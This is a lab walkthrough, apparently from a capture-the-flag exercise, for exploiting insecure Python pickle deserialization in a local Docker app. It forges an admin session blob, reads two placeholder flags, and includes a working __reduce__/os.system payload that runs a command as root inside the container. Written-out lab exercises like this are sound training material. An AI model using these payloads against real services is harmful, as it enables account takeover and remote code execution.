# Walkthrough: Deserialization Attack

## Setup

```bash
docker compose up --build -d
```

Wait until `Listening on http://0.0.0.0:8080` appears in the logs, then continue.

## Step 1: Explore the App

```bash
curl -s http://127.0.0.1:8091/
```

Output lists the available endpoints. The interesting one is `/api/session/restore`.

## Step 2: Log In as Alice and Inspect a Legitimate Blob

```bash
CJAR=$(mktemp)
curl -s -c "$CJAR" -b "$CJAR" -X POST http://127.0.0.1:8091/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"alice123"}'

curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8091/api/session/save
```

Output:

```json
{"note":"Save this and POST to /api/session/restore","session_blob":"gASVJQAAAAAAAAB9lCiMA3VzZXKUjAVhbGljZZSMA3JvbGWUjAR1c2VylHUu"}
```

Decode the blob to see it is a plain pickle of `{'user': 'alice', 'role': 'user'}`:

```bash
echo "gASV..." | python3 -c "import pickle,base64,sys; print(pickle.loads(base64.b64decode(sys.stdin.read().strip())))"
```

Output: `{'user': 'alice', 'role': 'user'}`

## Step 3: Forge an Admin Session

Build a pickle of `{'user': 'admin', 'role': 'admin'}`:

```bash
ADMIN_BLOB=$(python3 -c "
import pickle, base64
print(base64.b64encode(pickle.dumps({'user': 'admin', 'role': 'admin'})).decode())
")
echo "$ADMIN_BLOB"
```

POST it to the restore endpoint (using a fresh cookie jar):

```bash
rm -f "$CJAR"; CJAR=$(mktemp)
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8091/api/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$ADMIN_BLOB\"}"
```

Output:

```json
{"message":"Session restored","role":"admin","user":"admin"}
```

## Step 4: Read Flag 1

```bash
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8091/api/profile
```

Output (flag 1 in `hint`):

```json
{"email":"admin@corp.internal","hint":"POC{...}","role":"admin","username":"admin"}
```

## Step 5: Read Flag 2

```bash
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8091/api/admin/secret
```

Output (flag 2 in `secret`):

```json
{"secret":"POC{...}"}
```

## Bonus: RCE via __reduce__

```bash
RCE_BLOB=$(python3 -c "
import pickle, base64, os
class R:
    def __reduce__(self): return (os.system, ('id > /tmp/rce_proof.txt',))
print(base64.b64encode(pickle.dumps(R())).decode())
")

curl -s -X POST http://127.0.0.1:8091/api/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$RCE_BLOB\"}"

docker exec java-deserialization_app_1 cat /tmp/rce_proof.txt
```

Output: `uid=0(root) gid=0(root) groups=0(root)`

The shell command ran inside the container as root.

## Teardown

```bash
docker compose down
```
